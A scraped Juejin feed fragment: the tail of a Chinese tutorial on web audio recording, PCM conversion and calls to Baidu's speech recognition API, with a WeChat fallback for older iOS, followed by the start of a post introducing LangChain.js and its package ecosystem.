      chunks.push(e.data)<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>
  // 3. 准备接收录音数据
  // 录音结束时处理完整音频
  <span class="hljs-attr">recognition.onstop</span> = async () =&gt; {
    // ✅ 使用真实的 mimeType
    const <span class="hljs-attr">mimeType</span> = recognition!.mimeType || <span class="hljs-string">'audio/mp4'</span><span class="hljs-comment">;</span>
    const <span class="hljs-attr">blob</span> = new Blob(chunks, { type: mimeType })<span class="hljs-comment">;   // </span>

    // 1. 转 PCM / 看自己的 ASR 云服务是否需要
    const <span class="hljs-attr">pcmData</span> = await audioBlobToPcm(blob)<span class="hljs-comment">;</span>
    console.log('PCM 长度:', pcmData.byteLength, '字节')<span class="hljs-comment">;</span>

    // 2. 调用 百度 ASR 接口
    const <span class="hljs-attr">result</span> = await fetchAsrBaiduPro(pcmData, <span class="hljs-string">"自己的token"</span>)<span class="hljs-comment">;</span>
    console.log('语音识别返回', result)<span class="hljs-comment">;</span>


    if (<span class="hljs-attr">result.err_no</span> === <span class="hljs-number">0</span> &amp;&amp; result.result?.[<span class="hljs-number">0</span>]) {
      const <span class="hljs-attr">text</span> = result.result[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
      console.log('识别结果:', text)<span class="hljs-comment">;</span>
      eventBus.emit('senMsg', text)<span class="hljs-comment">;  // 处理自己的业务</span>
    } else {
      console.log('ASR 错误:', result.err_msg)<span class="hljs-comment">;</span>
      toast.fail("时间太短,未识别到语音")
      // alert(`识别失败: ${result.err_msg}`)<span class="hljs-comment">;</span>
    }
    // 直接下载音频查看----用于测试音频代码
    // const <span class="hljs-attr">url</span> = URL.createObjectURL(blob)<span class="hljs-comment">;</span>
    // const <span class="hljs-attr">a</span> = document.createElement(<span class="hljs-string">'a'</span>)<span class="hljs-comment">;</span>
    // <span class="hljs-attr">a.href</span> = url<span class="hljs-comment">;</span>
    // <span class="hljs-attr">a.download</span> = `recording-<span class="hljs-variable">${Date.now()}</span>.<span class="hljs-variable">${getExt(mimeType)}</span>`<span class="hljs-comment">;</span>
    // document.body.appendChild(a)<span class="hljs-comment">;</span>
    // a.click()<span class="hljs-comment">;</span>
    // document.body.removeChild(a)<span class="hljs-comment">;</span>

    // // 释放内存（延迟一点，确保下载完成）
    // setTimeout(() =&gt; URL.revokeObjectURL(url), 1000)<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>

} catch (error) {
  console.log(error)<span class="hljs-comment">;  // 这里监听不同报错处理业务</span>
  toast.fail('找不到符合条件的音视频设备')
}
</code></pre>
<p>blob 转 PCM 函数封装</p>
<pre><code class="hljs language-ini" lang="ini">// utils/audioToPcm.ts

/**
 * 将音频 Blob（如 audio/mp4）解码为 16kHz/16bit/单声道 PCM ArrayBuffer
 * @param audioBlob - 录音得到的音频 Blob
 * @returns PCM 格式的 ArrayBuffer  
 */
export async function audioBlobToPcm(audioBlob: Blob): Promise&lt;ArrayBuffer&gt; {
    return new Promise((resolve, reject) =&gt; {
        const <span class="hljs-attr">fileReader</span> = new FileReader()<span class="hljs-comment">;</span>
        <span class="hljs-attr">fileReader.onload</span> = async () =&gt; {
            try {
                const <span class="hljs-attr">audioContext</span> = new (window.AudioContext || (window as any).webkitAudioContext)()<span class="hljs-comment">;</span>
                const <span class="hljs-attr">audioData</span> = await audioContext.decodeAudioData(fileReader.result as ArrayBuffer)<span class="hljs-comment">;</span>

                // 重采样到 16kHz（可选，但百度要求 16k）
                const <span class="hljs-attr">sampleRate</span> = <span class="hljs-number">16000</span><span class="hljs-comment">;</span>
                let <span class="hljs-attr">offlineContext</span> = new <span class="hljs-literal">Off</span>lineAudioContext(<span class="hljs-number">1</span>, audioData.duration * sampleRate, sampleRate)<span class="hljs-comment">;</span>
                let <span class="hljs-attr">source</span> = <span class="hljs-literal">off</span>lineContext.createBufferSource()<span class="hljs-comment">;</span>
                <span class="hljs-attr">source.buffer</span> = audioData<span class="hljs-comment">;</span>
                source.connect(offlineContext.destination)<span class="hljs-comment">;</span>
                source.start()<span class="hljs-comment">;</span>

                const <span class="hljs-attr">renderedBuffer</span> = await <span class="hljs-literal">off</span>lineContext.startRendering()<span class="hljs-comment">;</span>

                // 转为 16-bit PCM
                const <span class="hljs-attr">float32Array</span> = renderedBuffer.getChannelData(<span class="hljs-number">0</span>)<span class="hljs-comment">; // 单声道</span>
                const <span class="hljs-attr">int16Array</span> = new Int16Array(float32Array.length)<span class="hljs-comment">;</span>
                for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; float32Array.length; i++) {</span>
                    // 浮点 <span class="hljs-section">[-1, 1]</span> → 16位整数 <span class="hljs-section">[-32768, 32767]</span>
                    const <span class="hljs-attr">s</span> = Math.max(-<span class="hljs-number">1</span>, Math.min(<span class="hljs-number">1</span>, float32Array[i]))<span class="hljs-comment">;</span>
                    int16Array<span class="hljs-section">[i]</span> = s &lt; 0 ? s * 0x8000 : s * 0x7FFF<span class="hljs-comment">;</span>
                }

                resolve(int16Array.buffer)<span class="hljs-comment">;</span>
            } catch (err) {
                reject(err)<span class="hljs-comment">;</span>
            }
        }<span class="hljs-comment">;</span>
        <span class="hljs-attr">fileReader.onerror</span> = () =&gt; reject(fileReader.error)<span class="hljs-comment">;</span>
        fileReader.readAsArrayBuffer(audioBlob)<span class="hljs-comment">;</span>
    })<span class="hljs-comment">;</span>
}
</code></pre>
<p>fetch调用 百度 ASR 函数封装：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// utils/asrBaiduPro.ts</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">AsrBaiduProResult</span> {
    <span class="hljs-attr">err_no</span>: <span class="hljs-built_in">number</span>;
    <span class="hljs-attr">err_msg</span>: <span class="hljs-built_in">string</span>;
    result?: <span class="hljs-built_in">string</span>[];
    sn?: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">/**
 * 调用百度语音识别 Pro API（需传入 PCM 音频数据）
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">pcmData</span> - PCM 音频的 ArrayBuffer（16kHz, 16bit, 单声道）
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">token</span> - 百度 OAuth2.0 access_token
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">cuid</span> - 设备唯一标识（建议固定值或生成）
 * <span class="hljs-doctag">@returns</span> 识别结果文本数组（result[0] 为主结果）
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchAsrBaiduPro</span>(<span class="hljs-params">
    pcmData: <span class="hljs-built_in">ArrayBuffer</span>,
    token: <span class="hljs-built_in">string</span>,
    cuid: <span class="hljs-built_in">string</span> = <span class="hljs-string">'web-client-'</span> + <span class="hljs-built_in">Date</span>.now()
</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">AsrBaiduProResult</span>&gt; {
    <span class="hljs-keyword">const</span> rate = <span class="hljs-number">16000</span>;
    <span class="hljs-keyword">const</span> channel = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">const</span> format = <span class="hljs-string">'pcm'</span>;
    <span class="hljs-keyword">const</span> devPid = <span class="hljs-number">80001</span>; <span class="hljs-comment">// 普通话 + 带标点 + 数字识别</span>

    <span class="hljs-comment">// 将 PCM 转为 Base64</span>
    <span class="hljs-keyword">const</span> base64Speech = <span class="hljs-title function_">arrayBufferToBase64</span>(pcmData);
    <span class="hljs-keyword">const</span> len = pcmData.<span class="hljs-property">byteLength</span>;

    <span class="hljs-keyword">const</span> payload = {
        format,
        rate,
        channel,
        <span class="hljs-attr">cuid</span>:<span class="hljs-string">'自己的标识'</span>,
        <span class="hljs-attr">dev_pid</span>: devPid,
        token,
        len,
        <span class="hljs-attr">speech</span>: base64Speech,
    };

    <span class="hljs-keyword">const</span> url = <span class="hljs-string">'https://vop.baidu.com/pro_api'</span>;

    <span class="hljs-keyword">try</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'【ASR】开始请求百度 Pro API...'</span>);
        <span class="hljs-keyword">const</span> t0 = performance.<span class="hljs-title function_">now</span>();
        <span class="hljs-comment">// xixi 是 vite 的 proxy 代理 https://vop.baidu.com/pro_api</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">"/xixi"</span>, {
            <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
            <span class="hljs-attr">headers</span>: {
                <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json; charset=utf-8'</span>,
                <span class="hljs-title class_">Accept</span>: <span class="hljs-string">'application/json'</span>,
            },
            <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload),
        });

        <span class="hljs-keyword">const</span> t1 = performance.<span class="hljs-title function_">now</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`【ASR】请求耗时: <span class="hljs-subst">${(t1 - t0).toFixed(<span class="hljs-number">2</span>)}</span> ms`</span>);

        <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP <span class="hljs-subst">${response.status}</span>: <span class="hljs-subst">${response.statusText}</span>`</span>);
        }

        <span class="hljs-keyword">const</span> <span class="hljs-attr">data</span>: <span class="hljs-title class_">AsrBaiduProResult</span> = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
        <span class="hljs-keyword">return</span> data;
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'【ASR】请求失败:'</span>, error);
        <span class="hljs-keyword">throw</span> error;
    }
}

<span class="hljs-comment">// 辅助函数：ArrayBuffer → Base64</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">arrayBufferToBase64</span>(<span class="hljs-params">buffer: <span class="hljs-built_in">ArrayBuffer</span></span>): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">let</span> binary = <span class="hljs-string">''</span>;
    <span class="hljs-keyword">const</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; bytes.<span class="hljs-property">length</span>; i++) {
        binary += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(bytes[i]);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">btoa</span>(binary);
}
</code></pre>
<h2 data-id="heading-5">方案c：微信提供的录音 api</h2>
<p>主要针对低版本的 IOS 和 微信对 getUserMedia 不支持。</p>
<p>正常使用 getUserMedia必须满足：新版本的 iOS（≥14.3） + 较新版本的微信（≥8.0.0） + 用户主动触发了录音（如点击按钮） + 页面是 HTTPS</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fdoc%2Fservice%2Fguide%2Fh5%2Fjssdk.html%23%25E9%259F%25B3%25E9%25A2%2591%25E6%258E%25A5%25E5%258F%25A3" target="_blank" title="https://developers.weixin.qq.com/doc/service/guide/h5/jssdk.html#%E9%9F%B3%E9%A2%91%E6%8E%A5%E5%8F%A3" ref="nofollow noopener noreferrer">developers.weixin.qq.com/doc/service…</a></p>
<p>方案b和c区别：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4c23159ab834e858ca9ab19afc884ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=Yph2aToIPL8KW5YvYrXGpk86efc%3D" alt="" loading="lazy"/></p>
<p>来源 ai</p>
<p>兼容性差异：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26446a6c8c7247beb8006f085eace02a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Juk6J-G5aSn546L5pyJ6K-d6K-0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769473817&amp;x-signature=ACDbpn3wsPinwz4%2B8jxVaXOXFTg%3D" alt="" loading="lazy"/></p>
<p>来源 ai</p>
<p>低版本IOS兼容：</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">startRecording</span>() {
  <span class="hljs-comment">// 1. 优先尝试 Web 录音（适合 Android/PC）</span>
  if (isWechat() &amp;&amp; <span class="hljs-built_in">isIOS</span>()) {
    <span class="hljs-comment">// 2. iOS 微信 → 强制使用 wx.startRecord()</span>
    <span class="hljs-built_in">useWechatRecord</span>();
  } else {
    <span class="hljs-comment">// 3. 其他环境 → 尝试 Web 录音</span>
    <span class="hljs-built_in">useWebRecord</span>()<span class="hljs-selector-class">.catch</span>(() =&gt; {
      <span class="hljs-comment">// 4. 失败则降级到 wx.startRecord()（如果是微信）</span>
      if (isWechat()) <span class="hljs-built_in">useWechatRecord</span>();
      else <span class="hljs-built_in">alert</span>('当前环境不支持录音');
    });
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain.js]]></title>    <link>https://juejin.cn/post/7596934200581455908</link>    <guid>https://juejin.cn/post/7596934200581455908</guid>    <pubDate>2026-01-20T01:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596934200581455908" data-draft-id="7596488155303034899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain.js"/> <meta itemprop="keywords" content="前端,LangChain"/> <meta itemprop="datePublished" content="2026-01-20T01:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="北丶故城"/> <meta itemprop="url" content="https://juejin.cn/user/465848662767367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain.js
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848662767367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    北丶故城
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:01:41.000Z" title="Tue Jan 20 2026 01:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">LangChain.js</h2>
<p>是 LangChain 生态下的 JavaScript/TypeScript 版本框架，专注于帮助开发者快速构建由大语言模型（LLM）驱动的应用程序，核心目标是简化 AI 应用开发流程，同时保证技术选型的未来兼容性。</p>
<p>用前端视角来看的话，<strong>它就是给前端做 AI 应用的「工具箱 + 组装手册」</strong>：我们平时写前端，会用 React/Vue 这类框架拼 UI 组件，用 axios 封装请求，用 Next.js 适配不同运行环境；而 LangChain.js 就是帮你「拼 AI 功能」的工具：不用从零写 “调用 ChatGPT / 通义千问”“让 AI 读 PDF/Notion 文档”“让 AI 联网搜信息” 这些逻辑，它把这些能力做成了现成的 “AI 组件”，你像搭积木一样拼起来，就能快速做出有实际用途的 AI 应用（比如智能文档问答、AI 助手、内容总结工具等）。</p>
<p><code>最新的langchainjs要求Node.js 20+</code></p>
<h3 data-id="heading-1">langchainjs的一些包分类说明</h3>
<h4 data-id="heading-2">官方包分类介绍</h4>

























<table><thead><tr><th>包名</th><th>功能说明</th></tr></thead><tbody><tr><td>langchain</td><td>主包，对外暴露的主入口。包含智能体、提示词、编排核心逻辑</td></tr><tr><td>@langchain/core</td><td>底层抽象接口（定义 AI 调用、工具扩展的基础规则）</td></tr><tr><td>@langchain/community</td><td>社区维护的第三方集成（文档加载、存储等）</td></tr><tr><td>@langchain/*</td><td>官方适配包（对接 OpenAI/Anthropic/ 百度等 AI 厂商、Weaviate 向量库）</td></tr></tbody></table>
<h4 data-id="heading-3">langchain的一些核心功能介绍</h4>






























<table><thead><tr><th>LangChain.js 功能</th><th>前端类比</th><th>实际用途举例</th></tr></thead><tbody><tr><td>文档加载器</td><td>前端的 FileReader / 上传解析组件</td><td>让 AI 读取 PDF/Notion/GitHub 文档</td></tr><tr><td>工具（Tool）</td><td>前端的自定义 Hook（封装小功能）</td><td>给 AI 加 “计算器 / 网页搜索 / 调企业 API” 能力</td></tr><tr><td>智能体（Agent）</td><td>前端的状态管理（比如 Redux）</td><td>让 AI 自己判断 “该用哪个工具”（比如问营收就调用搜索工具）</td></tr><tr><td>存储层（向量 / 对话存储</td><td>前端的 localStorage等缓存</td><td>存 AI 对话记录、存文档的 “AI 可理解版”（方便快速搜索）</td></tr></tbody></table>
<h4 data-id="heading-4">生态系统</h4>
<h5 data-id="heading-5">LangSmith</h5>
<p>LangSmith 是<strong>AI 版的 “前端调试 / 监控工具”</strong> （管 AI“做得对不对、快不快”）。</p>
<h5 data-id="heading-6">LangGraph</h5>
<p>LangGraph 是<strong>AI 版的 “前端流程编排工具”</strong> （管 AI “怎么做事”）。</p>
<p>俩都是 LangChain.js 生态的 “配套工具”，就像 React（LangChain.js）搭配 <a href="https://link.juejin.cn?target=https%3A%2F%2Fxstate.nodejs.cn%2F" target="_blank" title="https://xstate.nodejs.cn/" ref="nofollow noopener noreferrer">XState</a>（LangGraph）+ Sentry（LangSmith）一样，各司其职。</p>
<h4 data-id="heading-7">官方适配包</h4>
<h5 data-id="heading-8">一，LLM / 聊天模型适配包（对接各类大模型）</h5>































































































<table><thead><tr><th>包名</th><th>核心定位</th><th>关键能力 / 导出内容</th><th>适用场景</th></tr></thead><tbody><tr><td>langchain-anthropic</td><td>对接 Anthropic（Claude）系列模型</td><td>1，聊天模型类（ChatAnthropic） 2， 提示词转换工具 3，多类工具（网页搜索、代码执行、文本编辑等）</td><td>调用 Claude 模型做长文本对话、工具调用（如数据分析、网页抓取）</td></tr><tr><td>langchain-aws</td><td>对接 AWS 生态 AI 服务</td><td>1，聊天模型类 2，嵌入模型 3，检索器相关工具</td><td>调用 AWS Bedrock 等平台的 AI 模型、基于 AWS 做检索增强生成（RAG）</td></tr><tr><td>langchain-baidu-qianfan</td><td>对接百度千帆大模型平台</td><td>1，聊天模型类 2，嵌入模型</td><td>调用百度千帆的各类大模型、生成文本嵌入向量</td></tr><tr><td>langchain-cerebras</td><td>对接 Cerebras 大模型</td><td>导出聊天模型类</td><td>调用 Cerebras 平台的大模型进行对话生成</td></tr><tr><td>langchain-cohere</td><td>对接 Cohere 大模型</td><td>1，聊天模型 / LLM 类 2，嵌入模型 3，检索结果重排序（rerank）工具</td><td>文本生成、语义嵌入、RAG 场景下优化检索结果</td></tr><tr><td>langchain-google-common</td><td>Google 系服务核心适配层</td><td>1， 聊天模型 / LLM / 嵌入模型 2，鉴权 / 连接工具 3，安全策略、流式响应处理工具</td><td>为 Google GenAI/Vertex AI 提供通用能力，支持多模态输入、安全配置</td></tr><tr><td>langchain-google-genai</td><td>对接 Google Gemini 模型</td><td>1，聊天模型类 2，嵌入模型</td><td>直接调用 Gemini 通用大模型、生成文本嵌入向量</td></tr><tr><td>langchain-google-vertexai</td><td>对接 Google Vertex AI 平台</td><td>适配服务端鉴权的 Google 模型调用能力</td><td>基于 GCP 服务账号调用 Vertex AI 托管的 Gemini 等模型</td></tr><tr><td>langchain-mistralai</td><td>对接 Mistral AI 模型</td><td>1，聊天模型 / LLM 类 2，嵌入模型</td><td>调用 Mistral Large/Codestral 模型做通用文本生成、代码补全</td></tr><tr><td>langchain-nomic</td><td>对接 Nomic 嵌入模型</td><td>仅导出嵌入模型相关内容</td><td>生成 Nomic 体系的文本嵌入向量</td></tr><tr><td>langchain-ollama</td><td>对接本地 / 私有部署的 Ollama 模型</td><td>1，聊天模型 / LLM 类 2，嵌入模型 3， 类型定义</td><td>无需联网，调用本地部署的 Llama 3/Phi/Mistral 等模型（隐私优先场景）</td></tr><tr><td>angchain-openai</td><td>对接 OpenAI/Azure OpenAI 核心包</td><td>1， ChatGPT/GPT-4 聊天模型 2，LLM 类 / 嵌入模型 3，Azure OpenAI 全适配 4，工具调用能力</td><td>调用 OpenAI 原生模型、Azure 托管的 OpenAI 模型、生成嵌入向量、工具调用</td></tr><tr><td>langchain-xai</td><td>对接 XAI 相关服务</td><td>导出实时搜索工具（xaiLiveSearch）</td><td>基于 XAI 服务做实时网络搜索、补充 RAG 场景的实时信息</td></tr><tr><td>langchain-yandex</td><td>对接 Yandex GPT 模型</td><td>1，聊天模型 / LLM 类 2，嵌入模型 3，支持 Api-Key/IAM Token 双鉴权</td><td>调用 Yandex 云平台的 GPT 模型（俄语 / 多语言场景优势）</td></tr></tbody></table>
